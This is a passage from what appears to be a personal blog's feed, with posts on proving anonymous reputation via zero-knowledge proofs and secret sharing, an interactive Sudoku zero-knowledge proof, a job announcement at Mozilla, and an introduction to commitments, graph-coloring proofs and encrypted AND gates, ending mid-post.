    <content type="html"><![CDATA[<p>One of the reasons I like crypto is that it&rsquo;s a gold mine of interesting problems which feel
like they are impossible to solve and if a solution exists, it must be magic.</p>

<p>The other day, I came across one such problem <a href="https://twitter.com/SarahJamieLewis/status/763060674956173314">here</a>, by @SarahJamieLewis</p>

<blockquote><p>Is there a scheme where A can give reputation points to B, &amp; later, B presenting as C can prove
their reputation (without revealing A or B)?</p></blockquote>

<p>(I recommend trying to solve this yourself before reading ahead)</p>

<p>The problem isn&rsquo;t completely defined because we don&rsquo;t know how &ldquo;reputation&rdquo; is supposed to work. A
simple model is to think of it as currency, and use Bitcoin as a proxy. Of course, a real reputation
system probably would be different from currency. There might only be a small set of authorized
reputation &ldquo;sellers&rdquo; (this can still be built on top of Bitcoin, or you can use a system similar to
the CA system for TLS certificates). Or there might be a system in which each person can vote for
another person at most once (though this needs to be designed in a way that is resilient to sybil
attacks).</p>

<p>Let us assume that there is a ledger out there, where each ledger entry is a certificate saying that
entity X has given one reputation point to entity Y. A public key is included, where the private key
is only known to Y. This model cleanly applies to both Bitcoin and CA systems &ndash; in Bitcoin, the
transaction is the &ldquo;certificate&rdquo;, and in the CA system the certificate is the certificate.</p>

<p>For additional anonymity, you can have a different private key for each certificate. I&rsquo;m going to
assume this is the case, though the solutions don&rsquo;t change much if it isn&rsquo;t.</p>

<h2>Solution via ZKP</h2>

<p>I&rsquo;m very fond of the concept of a zero-knowledge proof, and when you have a hammer everything looks
like a nail.</p>

<p>So my first solution was one involving zero-knowledge proofs.</p>

<p>Construct the problem &ldquo;Given the certificates in this ledger and X private keys, prove that these
private keys each have one certificate they correspond to, and that the keys are distinct&rdquo;.</p>

<p>In this problem, the certificates (public keys) are hardcoded, whereas the private keys are inputs.
This sort of algorithm can be written as a sequential logic circuit, assuming that the method of
signing can be. We can then perform a zero-knowledge proof of this problem using the ZKP for general
execution <a href="http://manishearth.github.io/blog/2016/03/05/exploring-zero-knowledge-proofs/">outlined here</a>. The prover inserts their private keys into the algorithm,
run the algorithm, and prove that the execution was faithful and had an output of true using the ZKP.</p>

<p>Since the ZKP doesn&rsquo;t leak any information about its inputs, it doesn&rsquo;t leak which certificates
were the ones for which the prover had private keys, so it doesn&rsquo;t leak the identities of A or B.</p>

<p>However, this is overkill. The general ZKP gets very expensive as the size of the algorithm, and
since the ledger was hardcoded in it, this ZKP will probably take a while (or a lot of computational
power) to execute. One can perform it with a subset of the ledger picked by the prover, but
repeating the process may slowly reveal the identity of the prover via the intersection of these
subsets.</p>

<h2>Solution via secret-sharing</h2>

<p>(This solution is technically a ZKP too, but it doesn&rsquo;t use the &ldquo;general&rdquo; ZKP algorithm which
while expensive can be used for any combinatorical verification algorithm)</p>

<p>Once I&rsquo;d gotten the &ldquo;use a ZKP!&rdquo; solution out of my system, I thought about it more and realized
that the problem is very close to a secret-sharing one.</p>

<p>Secret-sharing is when you want to have a cryptographic &ldquo;lock&rdquo; (a shared secret) which can only be
revealed/opened when the requisite quorum of (any) X keys out of N total keys is used.</p>

<p>Shamir&rsquo;s secret sharing is a nice algorithm using polynomials that lets you do this.</p>

<p>In this situation, we want to prove that we have X private keys out of N total certificates in the
ledger.</p>

<p>The verifier (Victor) can construct a secret sharing problem with a single secret and N secret-
sharing-keys (in the case of Shamir, these would be N x,y-coordinate pairs). Each such key is paired
with a certificate, and is encrypted with the corresponding public key of that certificate.</p>

<p>The prover (Peggy) is given all of these encrypted secret-sharing keys, as well as the certificates
they correspond to.</p>

<p>If Peggy legitimately has X reputation, she has the X private keys necessary to obtain X of the
secret sharing keys by decrypting them. From this, she can obtain the secret. By showing the secret
to Victor, she has proven that she has at least X private keys corresponding to certificates in the
ledger, and thus has at least X reputation. In the process, <em>which</em> certificates were involved is
not revealed (so both the reputation-giver and reputation-receiver) stay anonymous.</p>

<p>Or was it?</p>

<p>Victor can construct a malicious secret sharing problem. Such a problem would basically reveal a
different secret depending on the secret-sharing-keys Peggy uses. For example, in Shamir&rsquo;s secret
sharing, Victor can just give N random coordinates. X of those coordinates will always create a
degree-X curve, but the curves obtained from different sets of X coordinates will probably have a
different constant term (and thus a different secret).</p>

<p>The secret-sharing problem needs to be transmitted in a way that makes it possible for Peggy to
verify that it&rsquo;s not malicious.</p>

<p>One way to do it is to make it possible to uncover <em>all</em> the secret-sharing-keys, but <em>only</em> after
the secret has been found. In Shamir&rsquo;s algorithm, this can be done by pre-revealing the x
coordinates and only encrypting the y coordinates. Once Peggy has found the secret, she has the
entire polynomial curve, and can input the remaining x coordinates into the curve to find the
remaining secret sharing keys (and then verify that they have been encrypted properly).</p>

<p>This is <em>almost perfect</em>. User &ldquo;otus&rdquo; on Crypto Stack Exchange <a href="http://crypto.stackexchange.com/q/39274/2081">pointed out my mistake</a>.</p>

<p>The problem with this scheme (and the previous one to a lesser degree) is that Peggy could simply
brute-force the values of the y coordinates beforehand.</p>

<p>This can be solved by using nonces. Instead of encrypting each y-coordinate, Victor encrypts each
y-coordinate, <em>plus a nonce</em>. So, instead of encrypting the y-coordinate &ldquo;42&rdquo;, a string like
&ldquo;da72ke8lv0q-42&rdquo; will be encrypted.</p>

<p>On decryption, it is easy to extract the coordinate from the plaintext (presumably the scheme used
to add the nonce would be decided upon beforehand). However, we can&rsquo;t brute-force for the plaintext
anymore, because the ciphertext isn&rsquo;t the encryption of a low-entropy value like a regular, smallish
number, it&rsquo;s the encryption of a relatively high-entropy value.</p>

<p>So far, this prevents brute forcing, but it also prevents Peggy from verifying that the secret-
sharing problem was non-malicious, since she doesn&rsquo;t know the nonces. Nor can these be pre-shared
with her, since she can just use them to brute force again.</p>

<p>The solution here is for Victor to use the shared secret as a symmetric key, encrypt all of the
nonces with it, and share them with Peggy. Until Peggy knows this key, she cannot use the nonces to
brute force. Once she knows this key, she can decrypt the values for the nonces and use them to
verify that the nonces are correct.</p>

<p>This is exactly the property we need. If Peggy doesn&rsquo;t have enough private keys (reputation points),
she won&rsquo;t have the secret and can&rsquo;t prove her reputation to Victor. Once Peggy does have the quorum
of keys, she will know the symmetric key, be able to decrypt the nonces, and use these nonces to
verify that the other N-X ciphertexts fall on the curve which she has obtained. Once she has
verified this, she can present the shared secret/symmetric key to Victor, who will know that she
had enough keys to crack the secret sharing problem and thus has at least X reputation.</p>

<hr />

<p>This was quite an entertaining problem to solve (and it got me thinking about ZKPs again, which
made me write my <a href="http://manishearth.github.io/blog/2016/08/10/interactive-sudoku-zero-knowledge-proof/">previous post</a>). Thanks, Sarah!</p>

<p>Got an alternate solution (or other similar fun problems)? Let me know!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Interactive Sudoku Zero-knowledge Proof]]></title>
    <link href="http://manishearth.github.io/blog/2016/08/10/interactive-sudoku-zero-knowledge-proof/"/>
    <updated>2016-08-10T12:21:19-07:00</updated>
    <id>http://manishearth.github.io/blog/2016/08/10/interactive-sudoku-zero-knowledge-proof</id>
    <content type="html"><![CDATA[<p>Back in March I was particularly interested in Zero-Knowledge Proofs. At the time, I wrote
<a href="http://manishearth.github.io/blog/2016/03/05/exploring-zero-knowledge-proofs/">a long blog post</a> introducing them and explaining how the ZKP for generic execution
works.</p>

<p>I was really enjoying learning about them, so I decided to do a presentation on them in my crypto
course. Sadly there wasn&rsquo;t going to be time for explaining the structure of the proof for general
execution, but I could present something more fun: Sudoku.</p>

<p>Sudoku solutions can be proven via ZKP. That is to say, if Peggy has a solution to Victor&rsquo;s Sudoku
problem, she can prove that she has a valid solution without ever revealing any information about
her solution to Victor (aside from the fact that it is valid).</p>

<p>To make the ZKP easier to explain, I wrote an <a href="https://manishearth.github.io/sudoku-zkp/zkp.html">interactive version of it</a>.</p>

<p>I planned to write about it then, but completely forgot till now. Oops.</p>

<p>I&rsquo;m first going to explain how the ZKP is carried out before I explain how the interactive verifier
works. If you aren&rsquo;t familiar with ZKPs, you might want to read
<a href="http://manishearth.github.io/blog/2016/03/05/exploring-zero-knowledge-proofs/">my previous post on the subject</a> up to and including the part about proving graph colorings.</p>

<h2>Proving Sudoku</h2>

<p>This proof is going to be carried out very similarly to the graph coloring proof. Indeed, Sudoku can
be reduced to a graph coloring problem, though that&rsquo;s not how we&rsquo;re going to obtain the ZKP.</p>

<p>Victor has a Sudoku problem:</p>

<p><img src="http://manishearth.github.io/images//sudoku-zkp/sudoku-problem.png" width="300"></p>

<p>Peggy has a solution:</p>

<p><img src="http://manishearth.github.io/images//sudoku-zkp/sudoku-solution.png" width="300"></p>

<p>In order to not leak information about her solution, Peggy permutes it:</p>

<p><img src="http://manishearth.github.io/images//sudoku-zkp/sudoku-solution-permuted.png" width="300"></p>

<p>Basically, there is a 1-1 mapping between the old digits and the new ones. In this specific
permutation, all 3s are replaced by 4s, all 1s by 5s, etc.</p>

<p>She now commits to this permutation by committing to every individual cell. A random nonce is
obtained for each cell, and the contents of that cell are hashed along with the nonce. This
is the same commitment procedure used in the graph coloring ZKP.</p>

<p>These commitments are now sent over to Victor.</p>

<p>Victor ponders for a bit, and demands that Peggy reveal the third row of the sudoku square.</p>

<p><img src="http://manishearth.github.io/images//sudoku-zkp/victor-ask.png" width="300"></p>

<p>(Note that this is the non-permuted problem statement)</p>

<p>This row is marked in orange. There are some additional elements marked in green, which I shall
get to shortly.</p>

<p>Peggy reveals the permuted values for this row:</p>

<p><img src="http://manishearth.github.io/images//sudoku-zkp/peggy-reveal-orange.png" width="300"></p>

<p>Victor can now verify that all digits 1-9 appear within this permuted row, and that they match the
commitments. This means that they appear in the original solution too (since permutation doesn&rsquo;t
change this fact), and, at least for this row, the solution is correct. If Peggy didn&rsquo;t have a
solution, there was a chance she&rsquo;d be caught in this round if Victor had asked for the right
set of 9 squares to be revealed.</p>

<p>The procedure can be repeated (with a new permutation each time) to minimize this chance, with
Victor asking to reveal a row, column, or 3x3 subsquare each time, until he is certain that Peggy
has a solution.</p>

<p>But wait! This only works towards proving that Peggy has a valid Sudoku solution, not that this
is <em>the</em> solution to Victor&rsquo;s specific problem. Victor only verified that each row/column/subsquare
had no duplicates, a property which is true for all sudoku solutions!</p>

<p>This is where the green squares come in. For any given set of &ldquo;orange squares&rdquo; (a row, column, or
3x3 subsquare), we take the &ldquo;preset&rdquo; digits appearing in the problem statement (In this case: 7, 8,
and 6) in that set of squares. All other instances of those digits preset in the problem statement
form the set of &ldquo;green squares&rdquo;:</p>

<p><img src="http://manishearth.github.io/images//sudoku-zkp/victor-ask.png" width="300"></p>

<p>Peggy reveals the permuted values for both the green and orange squares each time:</p>

<p><img src="http://manishearth.github.io/images//sudoku-zkp/peggy-reveal-both.png" width="300"></p>

<p>In addition to verifying that there are no duplicates in the orange squares, Victor additionally
verifies that the permutation is consistent. For example, the 7th element in that row is a 6, which
is already preset in the problem statement. There are two other 6s in the problem statement, one in
the 5th row 8th column, and one in the 7th row 1st column. If the permutation is consistent, their
corresponding squares in the revealed portion of the permuted solution should all have the same
digit. In this case, that number is 1. Similarly, the 5th element in that row is a preset 8, and
there&rsquo;s a corresponding green square in the 5th row last column that also has an 8. In the permuted
solution, Victor verifies that they both have the same digit, in this case 7.</p>

<p>This lets Victor ensure that Peggy has a solution to his sudoku problem. The fact that two given
squares must share the same digit is invariant under permutations, so this can be safely verified.
In fact, a sudoku problem is really just a problem saying &ldquo;Fill these 81 squares with 9 symbols such
that there are no duplicates in any row/column/subsquare, and these three squares have the same
symbol in them, and these five squares have the same symbol in them, and &hellip;&rdquo;. So that&rsquo;s all we
verify: There should be no duplicates, and the digits in certain sets of squares should be the same.</p>

<p>Note that revealing the green squares doesn&rsquo;t reveal additional information about Peggy&rsquo;s solution.
Assuming Peggy&rsquo;s solution is correct, from comparing the problem statement with the
revealed/permuted values, Victor already <em>knows</em> that in the permutation, 7 has become 6, 8 has
become 7, and 6 has become 1. So he already knows what the other preset green squares contain, he
is just verifying them.</p>

<p>We cannot reveal anything <em>more</em> than the green squares, since that would reveal additional
information about the permutation and thus the solution.</p>

<p>Edit: This actually <em>still</em> isn&rsquo;t enough, which was pointed out to me by &ldquo;dooglius&rdquo;
<a href="https://github.com/Manishearth/sudoku-zkp/issues/1">here</a>. Basically, if the sudoku problem has two digits which only appear once each,
there is nothing that can stop Peggy from coming up with a solution where these two digits have been
changed to something else (since they&rsquo;ll never be in a green square). Fixing this is easy, we allow
Victor to ask Peggy to reveal just the permuted values of the presets (without simultaneously
revealing a row/column/subsquare). Victor can then verify that the preset-permutation mapping is
consistent (all presets of the same value map to the same permutation) and 1-1.</p>

<p>This check actually obviates the need of the green squares entirely. As long as there is a chance
that Victor will ask for the presets to be revealed instead of a row/column/subsquare, Peggy cannot
try to trick Victor with the solution of a different sudoku problem without the risk of getting
caught when Victor asks for the presets to be revealed. However, the green squares leak no
information, so there&rsquo;s no problem in keeping them as a part of the ZKP as a way to reduce the
chances of Peggy duping Victor.</p>

<h2>The interactive verifier</h2>

<p>Visit the <a href="https://manishearth.github.io/sudoku-zkp/zkp.html">interactive verifier</a>. There&rsquo;s a sudoku square at the top which you can fill
with a problem, and you can fill the solution in on the first square on the Prover side &ndash; fill this
in and click Start. Since I know nobody&rsquo;s going to actually do that, there&rsquo;s a &ldquo;Fill with known
problem/solution&rdquo; that does this for you.</p>

<p>Once you&rsquo;ve initiated the process, the ball is in the Prover&rsquo;s court. The Prover must first permute
the solution by clicking the Permute button. You can edit the permutation if you like (to introduce
a flaw), or manually do this after clicking the button.</p>

<p>Once you&rsquo;ve clicked the button, generate nonces by clicking the next one, &ldquo;Populate Nonces&rdquo;. These,
too can be edited. You can generate hashes (which can also be edited) by clicking the next button,
and after that send the hashes (commitments) over to the Verifier&rsquo;s side.</p>

<p>The ball is now in the Verifier&rsquo;s court. As you can see, there&rsquo;s a set of hashes on the Verifier&rsquo;s
side. The Verifier only knows the problem statement and whatever is visible on their side of the
screen, and nothing more.</p>

<p>You, acting on behalf of the Verifier, can now select a row/column/subsquare/preset using the
dropdown and text box on the Verifier. As you select, the orange/green squares that are going to be
revealed will be shown. When satisfied with your choice, click &ldquo;Reveal&rdquo;, and the Prover will
populate your squares with the permuted values and nonces. &ldquo;Verify&rdquo; will verify that:</p>

<ul>
<li>The appropriate elements and hashes are revealed</li>
<li>The hash is equal to <code>SHA256(nonce + "-" + digit)</code></li>
<li>The orange squares contain distinct digits.</li>
<li>The green squares contain digits that match with the orange squares they correspond to from the problem solution</li>
</ul>


<p>Once you click verify, it will show the probability of correctness (this isn&rsquo;t an exact value, it&rsquo;s
calculated using an approximate formula that doesn&rsquo;t depend on the problem statement), and the ball
moves back into Peggy&rsquo;s court, who can permute her solution again and continue. The probability
slowly increases each round.</p>

<p>Doing this manually till it reaches 99% is boring, so there&rsquo;s a button at the top (&ldquo;Run
automatically&rdquo;) which can be clicked to run it for a given number of rounds, at any stage in the
process once started. If you tamper with one of the values in the permuted solution, and run it
for ~20 runs, it usually gets caught.</p>

<p>Have fun!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Starting at Mozilla]]></title>
    <link href="http://manishearth.github.io/blog/2016/06/04/starting-at-mozilla/"/>
    <updated>2016-06-04T21:44:37-07:00</updated>
    <id>http://manishearth.github.io/blog/2016/06/04/starting-at-mozilla</id>
    <content type="html"><![CDATA[<p>I got a job!</p>

<p>I&rsquo;m now working at Mozilla as a Research Engineer, on <a href="https://servo.org/">Servo</a>.</p>

<p>I started two weeks ago, and so far I&rsquo;m really enjoying it! I feel quite lucky to
get to work on an open source project; with an amazing and helpful team. Getting to do most
of my work in Rust is great, too :)</p>

<p>So far I&rsquo;ve been working on the network stack (specifically, <a href="https://github.com/servo/servo/pull/11556">&ldquo;making fetch happen&rdquo;</a>),
and I&rsquo;ll probably be spending time on DOM things as well.</p>

<p>Really excited to see how this goes!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploring Zero-Knowledge Proofs]]></title>
    <link href="http://manishearth.github.io/blog/2016/03/05/exploring-zero-knowledge-proofs/"/>
    <updated>2016-03-05T01:46:01-08:00</updated>
    <id>http://manishearth.github.io/blog/2016/03/05/exploring-zero-knowledge-proofs</id>
    <content type="html"><![CDATA[<p><em>Follow up article to this one <a href="http://manishearth.github.io/blog/2016/08/10/interactive-sudoku-zero-knowledge-proof/">here</a></em></p>

<p>So recently I read <a href="https://bitcoincore.org/en/2016/02/26/zero-knowledge-contingent-payments-announcement/">this article</a> about how the Bitcoin community had executed
what&rsquo;s known as a &ldquo;Zero-Knowledge Contingent Payment&rdquo;; a pretty neat concept.</p>

<p>What was really interesting for me was the <a href="https://people.xiph.org/~greg/simple_verifyable_execution.txt">(simplified) underlying algorithm</a> for generic
zero knowledge proofs. It took me a while (and some questions asked to helpful folks on the
Internet) to understand it fully, but the concept is quite intriguing and sounds rather magical. I
thought I&rsquo;d explain it here in an accessible way, both so that others can get it and to
improve my own understanding.</p>

<p>I intend this article to be read by people with a programming or mathematical background<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>,
who have some understanding of what logic gates are. Please let me know if you feel that something
is inadequately (or wrongly) explained.</p>

<h2>So what is a zero knowledge proof?</h2>

<p>Let&rsquo;s say Alice has a problem she wants to solve. It could be a mathematical problem, like
factorizing a large number, or coloring a map (or graph!) with only three colors, or solving a
Sudoku puzzle. Anything where you can write a program to verify the solution.</p>

<p>She doesn&rsquo;t have the resources to solve the problem herself, but wants to buy a solution from
someone else. She makes the problem public, and Bob says he has a solution.</p>

<p>However, Alice is skeptical. She&rsquo;s not sure if Bob is telling the truth here, and would like some
evidence that he does indeed have a solution. At the same time, Bob is not willing to share his
solution with Alice without getting paid. They also don&rsquo;t want to involve a third party; let&rsquo;s say
this is a rather Important Sudoku Puzzle that affects National Security ยฏ\_(ใ)_/ยฏ.</p>

<p>What Alice and Bob need here is a way for Bob to prove to Alice that he has the solution, without
sharing the solution, and without involving a third party<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>.</p>

<p>It turns out that this is totally possible (magical, right!). There&rsquo;s a quick example
<a href="https://en.wikipedia.org/wiki/Zero-knowledge_proof#Abstract_example">on Wikipedia</a> of a simple proof of a non-mathematical fact &ndash; whether or not someone
has a key to a particular door.</p>

<p>For proving more complicated problems, we have to digress into some basic crypto first</p>

<h2>Interlude: Hashes and commitments</h2>

<p><em>Feel free to skip this if you know what a hash function and a nonce is.</em></p>

<p>In cryptography, there&rsquo;s something called a &ldquo;hash function&rdquo;. In essence it&rsquo;s an &ldquo;irreversible&rdquo;
function whose output is known as a &ldquo;hash&rdquo;, with the following three properties:</p>

<ul>
<li>It&rsquo;s not computationally intensive to calculate the hash of an input</li>
<li>Given a hash, it&rsquo;s a computationally hard problem to calculate an input to the hash function that results in this hash, usually involving brute force</li>
<li>It&rsquo;s also a computationally hard problem, given an input and a hash, to find a different input (<em>especially</em> a different input that is similar to the first one) that produces the same hash.</li>
</ul>


<p>Note that multiple values <em>may</em> result in the same hash.</p>

<p>The result of this is basically that hashes are hard to forge. If Bob shares a hash <code>Y = H(X)</code> with
Alice, where <code>X</code> is some secret data and <code>H</code> is a hash function, if Bob reveals <code>X</code> at some later
point, by checking that <code>Y = H(X)</code>, Alice can be reasonably certain that the value shared by Bob was
indeed the original input to the hash function and not tampered with in a way that the same hash was
produced. Similarly, Bob can be certain that knowing only <code>Y</code>, Alice cannot reverse-engineer <code>X</code>
since the hash function is &ldquo;irreversible&rdquo;.</p>

<p>This brings us to the concept of a commitment. Hashes can be used as described above to &ldquo;commit&rdquo; to
a value. If Bob decides on a number <code>X</code>, and makes its hash <code>Y</code> public, he has committed to this
value without revealing it. When he does decide to reveal it, he is forced to reveal <code>X</code> and not
some modified bogus value, thus making the &ldquo;commitment&rdquo; binding.</p>

<p>Some of you may have noticed a flaw here: It&rsquo;s hard to commit to small numbers, or things that come
from a restricted set. If Bob wishes to commit to the number <code>5</code> (without revealing it), or the
color <code>red</code> (out of a set of three colors), Alice can just try <code>H(0)</code> to <code>H(9)</code> or <code>H(red),
H(green), H(blue)</code> and find out which one matches. After all, hashes aren&rsquo;t supposed to be resilient
to brute force attacks, and brute force attacks become very easy when the set of inputs is tiny.</p>

<p>A solution to this is to use a <em>nonce</em> (also known as a &ldquo;trapdoor&rdquo;). Bob commits to <code>5</code> by hashing
the string <code>5-vektvzkjyfdqtnwry</code>, where <code>vektvzkjyfdqtnwry</code> is a random value he selected, known as
a &ldquo;nonce&rdquo;. When Bob wishes to reveal the value, he just reveals <code>5-vektvzkjyfdqtnwry</code> and Alice is
convinced that the original value committed to was indeed 5. Of course, this requires some agreement
on the format of the nonce; in this case the nonce is just &ldquo;everything after the dash&rdquo;. Note that
the nonce is private, and only revealed when Bob wishes to reveal the committed number.</p>

<p>Note that each new commitment should use a new nonce. Otherwise, information can be leaked; for
example if Bob needs to commit to three numbers (say, 2, 5, 2) in a way that they can be
individually revealed, he shouldn&rsquo;t compute the hashes for
<code>2-vektvzkjyfdqtnwry, 5-vektvzkjyfdqtnwry, 2-vektvzkjyfdqtnwry</code>, since the first
and last hashes will be equal and Alice will know that the committed values behind them are probably
the same too (something which you may not wish to reveal).</p>

<p>Another issue that can turn up is a &ldquo;rainbow table&rdquo;, where one party comes into the game with a
precomputed table of hashes of all strings up till a certain number of characters. One solution for
this is to increase the nonce size, however since Bob decides the nonces it&rsquo;s possible for him to
smartly select them if he&rsquo;s the one with a table. The solution here is to use a &ldquo;salt&rdquo;, which is a
large random string combined with the committed value and hash. Bob and Alice could, for example,
mutually decide on a salt of <code>asdcjyxeafxjvikfzmnyfqsehsxwxsfywbreb</code>, and when Bob wishes to
commit to the number <code>5</code>, he hashes
<code>asdcjyxeafxjvikfzmnyfqsehsxwxsfywbreb-5-vektvzkjyfdqtnwry</code>. Note that salts work similar
to nonces here, however the salt is known publically (you can model it as a last-minute modification
of the agreed-upon hash function <code>H</code>, since <code>H'(X) = H(add_salt(X))</code>). In some cases, you may also
want a per-instance salt, which is mutually decided every time Bob wants to compute a hash.</p>

<p>Hashes are a useful building block for many things; they&rsquo;re a key component in password security, as
well as being part of all kinds of cryptographics protocols. In this post we&rsquo;ll mainly focus on
their ability to be used as a unbreakable commitment.</p>

<p>Back to your regularly scheduled blog post.</p>

<h2>Coloring graphs</h2>

<p>The classic example of zero knowledge proofs is graph coloring.  I&rsquo;ll run through a quick
explanation, though it&rsquo;s explained beautifully <a href="http://blog.cryptographyengineering.com/2014/11/zero-knowledge-proofs-illustrated-primer.html">here</a> too.</p>

<p>Let&rsquo;s say Alice has a graph:</p>

<p><img src="http://manishearth.github.io/images/post/alice-graph.png"></p>

<p>No, not that kind, Alice. The <em>other</em> graph.</p>

<p><img src="http://manishearth.github.io/images/dotgen/graph-uncolored.dot.png"></p>

<p>She wants it colored such that no two adjacent nodes share a color. This is an NP-complete problem (so
it can take up a lot of computational resources to solve). Of course, <em>this</em> graph is small and easy
to color, but that&rsquo;s just for the sake of this blog post.</p>

<p>Bob, using his trusty Crayolaโข 3-crayon set<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>, has managed to come up with a valid coloring:</p>

<p><img src="http://manishearth.github.io/images/dotgen/graph-colored.dot.png"></p>

<p>He wishes to prove that he has this to Alice, without revealing it or involving a third party.
Probably for National Security Reasons. Something something Nicolas Cage.</p>

<p>Bob and Alice meet, and Alice gives him a large piece of paper with the (uncolored) graph drawn on
it.</p>

<p>Bob goes into a private room, and colors it. He also covers each graph node with a hat. Alice now
enters the room.</p>

<p>Alice chooses an adjacent pair of nodes. Let&rsquo;s say she chooses 1 and 2. Bob removes those two hats
(since Alice is watching him, he has no chance to tamper with the colorings underneath the hats
before revealing them). Now, Alice knows the colors of nodes 1 and 2:</p>

<p><img src="http://manishearth.github.io/images/dotgen/graph-12.dot.png"></p>

<p>This lets her verify that nodes 1 and 2 had different colorings in the graph Bob drew.</p>

<p>Note that this doesn&rsquo;t actually <em>tell</em> her anything about Bob&rsquo;s coloring aside from the increased
probability of correctness. The colors can always be permuted, so <em>any</em> valid coloring would give
the same answer here if the colors were permuted so that 1 is red and 2 is blue. This is important;
we don&rsquo;t want to leak information about Bob&rsquo;s solution aside from the fact that it is correct.</p>

<p>Nor is this information enough to verify correctness. Bob could have equally drawn a wrong
coloring.</p>

<p><img src="http://manishearth.github.io/images/dotgen/graph-wrong.dot.png"></p>

<p>(clearly someone wasn&rsquo;t paying attention in kindergarten)</p>

<p>Since Alice only looked at nodes 1 and 2, she didn&rsquo;t see anything wrong with the graph. But if she
had by chance picked nodes 3 and 4, Bob&rsquo;s deception would have been revealed.</p>

<p>So she only has 14% (1/7) certainity<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup> that Bob&rsquo;s graph is correct.</p>

<p>However, we can run this experiment again. Bob can permute the colors, draw on a fresh copy of the
graph, and ask Alice to choose another pair of adjacent nodes. She can check this, and the
probability of correctness will increase to around 27% (1 - (6/7)*(6/7)).</p>

<p>Since Bob has permuted the colors, Alice cannot use the information from the previous round to glean
any information about Bob&rsquo;s solution in this round. Of course, Bob is free to produce a completely
different coloring (one that is not a permutation), with a different flaw this time. Regardless of
where the flaw is, Alice still has a chance of uncovering it each time.</p>

<p>This can continue until Alice is satisfied that there is a very little chance that Bob has cheated.
For example, after 60 rounds, Alice would be 99.99% certain.</p>

<p>Note that this didn&rsquo;t actually involve any cryptography; it was an algorithm based on <em>information
flow</em>. However, if you want this to work securely (in the current solution Alice could push Bob away
and reveal all the nodes herself) and make it work without requiring Alice and Bob to be in the same
location, you need to use hashes.</p>

<p>Remember when Bob colored the graph whilst alone in the secret room? Once Alice had entered the
room, this coloring was <em>committed</em>. There was no way for Bob to tamper with this coloring.</p>

<p>We do the same thing here. After obtaining a valid coloring, Bob <em>commits</em> to this coloring by
calculating some hashes.</p>

<table>
<thead>
<tr><th>Node</th><th>Color(private)</th><th>Nonce(private)</th><th>Hash</th></tr>
</thead>
<tr><td>1</td><td>red</td><td>wmdqatobck</td><td>e1f957bedcceeb217305bfa12cbee4abac36eff1</td></tr>
<tr><td>2</td><td>blue</td><td>fmcbpzkgyp</td><td>87d9d7239909c28ec8d73a3b9a99673cbf870046</td></tr>
<tr><td>3</td><td>green</td><td>dktuqvrsss</td><td>a40bafb81149937c77ae55589aff1b53d9c043d8</td></tr>
<tr><td>4</td><td>blue</td><td>auhbyuzkmz</td><td>b3503962937850f7c1b59cf4b827ca40a62b122a</td></tr>
<tr><td>5</td><td>red</td><td>gfunjcmygk</td><td>d8db52bb36ca595b9231180c1055fe3958c3ea7d</td></tr>
</table>


<p><br></p>

<p>(The hashes here are calculated using SHA-1 for the hashing algorithm. It&rsquo;s not considered very
secure anymore, but the secure ones all output huge hashes which spill over the page)</p>

<p>Bob sends the public part of the table (the node-hash mapping) to Alice. Alice asks for nodes 1 and
2, and Bob reveals the entire table entry for those two nodes (including the nonce).</p>

<p>Note that since Alice now knows the color and nonce for nodes 1 and 2, she can verify that the
colors shown are indeed the ones Bob committed to. <code>echo red-wmdqatobck | sha1sum</code> if you want to
check on a local Unixy shell.</p>

<p>As in the previous case, Alice can repeat this algorithm until she reaches an acceptable level of
certainty (each time with a permutation of colors and a new set of nonces).</p>

<p>A lot of zero knowledge proofs (but not all!) are inherently probabalistic and interactive. They
involve multiple rounds where in each round the prover (Bob) commits to something, the verifier
(Alice) challenges the prover to reveal some information. The process repeats, with the certainity
on the verifier&rsquo;s side approaching 100% as more and more rounds happen.</p>

<h2>Zero Knowledge Proof for General Execution</h2>

<p>It turns out that you can have a ZKP exchange for the execution of any algorithm that can be
transcribed into combinatorical logic. In other words, you should be able to write the program
without loops and recursion, though loops bounded by a constant are allowed<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>. This isn&rsquo;t as
restrictive as it seems, usually <em>verification</em> is a straightforward task not involving convoluted
loops. The examples above (graph coloring<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup>, sudoku, prime factorization<sup id="fnref:7"><a href="#fn:7" rel="footnote">7</a></sup>) can all be verified
without loops.</p>

<p>The algorithm shown here is by Gregory Maxwell, originally published <a href="https://people.xiph.org/~greg/simple_verifyable_execution.txt">here</a>. It&rsquo;s somewhat
inefficient, but it demonstrates the idea behind ZKP for general execution. As mentioned there, it
can be optimized using techniques described in <a href="https://eprint.iacr.org/2013/155.pdf">this paper</a>.</p>

<p>Let&rsquo;s get started. Any combinatorical program can be decomposed into a bunch of AND and NOT
gates, taking in a bunch of input values and giving out one or more output values. For simplicity
let&rsquo;s assume that the problem statement (i.e. the specific sudoku puzzle, etc) that needs verifying
is embedded inside the program, and the final output of the program is just a single boolean
indicating whether or not the input is a solution. This algorithm, however, can work for programs
with arbitrarily large outputs.</p>

<p>Alice and Bob do this decomposition. The also agree on a numbering of the AND gates. Let&rsquo;s say
that there are N AND gates. We&rsquo;re mostly going to ignore the NOT gates for the purpose of this
article &ndash; they&rsquo;re there, but they aren&rsquo;t modified or anything.</p>

<h3>Creating encrypted AND gates</h3>

<p>Now, Bob creates 4*N <em>encrypted AND gates</em>. This is an AND gate, but with the
inputs and outputs all muddled up.</p>

<p>This is a regular AND gate:</p>

<p><img src="http://manishearth.github.io/images/post/and-and.png" width="200"></p>

<p>This is an encrypted AND gate:</p>

<p><img src="http://manishearth.github.io/images/post/and-and.png" width="200"></p>

<p>(yes, it can be identical to an AND gate)</p>

<p>So is this:</p>

<p><img src="http://manishearth.github.io/images/post/and-encr1.png" width="300"></p>

<p>and this:</p>

<p><img src="http://manishearth.github.io/images/post/and-encr2.png" width="300"></p>

<p>Basically, each input and the output may or may not be inverted. We can model this in a different
way, there is an <em>encryption key</em> corresponding to each input and output. This key is XORd with the
input/output (so if the key is 1, the wire is inverted, and if the key is 0, the wire is not
inverted).</p>

